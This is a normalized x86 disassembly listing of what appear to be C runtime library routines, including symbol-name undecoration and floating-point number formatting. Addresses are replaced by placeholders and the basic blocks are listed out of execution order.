lea eax [ ebp - 0x1c ]
push eax
push 0x20
lea ecx [ ebp - 0x24 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42d2c8
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push r--data
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_42d39f
jmp r-xdata
mov eax [ ebp + 0x8 ]
test bl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_42d39f
test bl 0x2
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x24 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
sub eax ecx
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
inc [ rw-data ]
mov [ ebp - 0x1 ] al
movzx eax al
cmp eax 0x4d
jg r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_42d39f
push r--data
lea ecx [ ebp - 0xc ]
call sub_42d581
jmp r-xdata
sub eax ecx
je r-xdata
cmp eax 0x4e
je r-xdata
cmp eax 0x4c
jge r-xdata
sub eax 0x14
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x4f
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x47
jg r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
sub eax 0x45
je r-xdata
push 0xfffffffe
pop ebx
cmp eax 0x52
je r-xdata
cmp eax 0x48
jl r-xdata
cmp eax 0x46
jge r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x57
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x49
jle r-xdata
push r--data
jmp r-xdata
test eax eax
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
add eax 0xffffffa8
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
cmp eax 0x4b
jg r-xdata
dec [ rw-data ]
push 0x1
lea ecx [ ebp - 0xc ]
call sub_42cde6
jmp r-xdata
cmp eax 0x24
je r-xdata
sub eax ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push r--data
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_431381
push eax
push r--data
push [ ebp + 0x8 ]
call sub_42d787
add esp 0x14
jmp r-xdata
add eax 0xffffffbc
cmp eax 0x1
ja r-xdata
sub eax ecx
jne r-xdata
push r--data
jmp r-xdata
sub_431744
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
movsx eax [ eax ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
sub eax ebx
push esi
mov [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp + 0xc ]
sub eax 0x24
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x1 ]
cmp al 0x24
je r-xdata
sub eax 0x1d
mov esi [ ebp + 0xc ]
je r-xdata
add [ rw-data ] 0x2
mov eax [ rw-data ]
movsx eax [ eax ]
mov esi [ ebp + 0xc ]
cmp eax 0x51
jg r-xdata
cmp al bl
je r-xdata
push r--data
dec eax
je r-xdata
sub eax 0x52
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x8 ]
call sub_42d39f
cmp [ esi ] ebx
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_431381
push r--data
lea ecx [ ebp - 0x8 ]
call sub_42d39f
cmp [ esi ] ebx
je r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_42d52f
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_42d52f
inc [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ esi ]
mov esi [ esi + 0x4 ]
inc [ rw-data ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
or esi 0x100
mov [ ebp - 0xc ] esi
call sub_4310f6
add esp 0x10
jmp r-xdata
push esi
jmp r-xdata
sub eax 0x41
je r-xdata
mov ecx [ ebp + 0x8 ]
inc [ rw-data ]
push r--data
call sub_42d09f
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
inc [ rw-data ]
push esi
push [ ebp + 0x8 ]
call sub_430639
jmp r-xdata
dec eax
je r-xdata
pop ecx
pop ecx
jmp r-xdata
inc [ rw-data ]
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_42e520
jmp r-xdata
dec eax
jne r-xdata
add esp 0xc
inc [ rw-data ]
and [ ebp - 0x4 ] ecx
push ebx
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x18 ]
push esi
push eax
mov [ ebp - 0x8 ] ebx
call sub_430a18
push eax
push [ ebp + 0x8 ]
call sub_431381
add esp 0x1c
jmp r-xdata
sub_4318f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_42cc5a
mov eax [ rw-data ]
mov al [ eax ]
xor ecx ecx
cmp al cl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push 0x1
call sub_42ccad
cmp al 0x3f
je r-xdata
inc [ rw-data ]
and [ ebp - 0xc ] 0xffff0000
push ecx
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_430a18
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_431744
add esp 0x1c
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
inc [ rw-data ]
cmp [ ebp - 0x8 ] ecx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_431744
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push r--data
call sub_42d09f
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_42d09f
jmp r-xdata
mov ecx eax
call sub_42d4e7
sub_4319c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push esi
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
xor esi esi
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov esi eax
jmp r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4318f5
lea eax [ ebp - 0x10 ]
push eax
call sub_42cb99
mov eax [ ebp - 0x10 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x20
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_431a4b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_43856c
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_437fe2
test eax eax
movsx eax [ esi ]
push eax
call sub_43856c
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_431abf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_431b41
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_431b5d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_438717
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_438598
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_431bb9
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_427be0
inc eax
push eax
push esi
add esi edi
push esi
call sub_424b60
add esp 0x10
sub_431bfe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_42b774
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_4268f3
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_431bb9
pop esi
mov [ eax ] esi
call sub_42970c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_424b60
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_431d5f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438974
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_4268f3
mov [ eax ] ebx
call sub_42970c
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_431bfe
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_43880e
add esp 0x10
test eax eax
je r-xdata
sub_431e26
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431d5f
add esp 0x18
pop ebp
retn
sub_431e46
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_42b774
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_4268f3
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_42970c
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_431e26
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_437de0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_438af0
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_438af0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_4338e0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_438af0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_438a10
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_438a10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_438a10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_4321bc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431e46
add esp 0x18
pop ebp
retn
sub_4321dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_42b774
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_427be0
inc eax
push eax
push esi
push ebx
call sub_424b60
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_427be0
inc eax
push eax
push esi
push ebx
call sub_424b60
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_431bb9
push edi
push 0x30
push ebx
call sub_4338e0
add esp 0xc
sub_4322df
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438974
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_4268f3
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_4268f3
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_43880e
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_4321dc
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_4323bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438974
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_4268f3
mov [ eax ] edi
call sub_42970c
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_43880e
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_431bfe
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_4321dc
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_4324aa
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4323bd
add esp 0x18
pop ebp
retn
sub_4324ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431d5f
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4322df
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431e46
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4323bd
jmp r-xdata
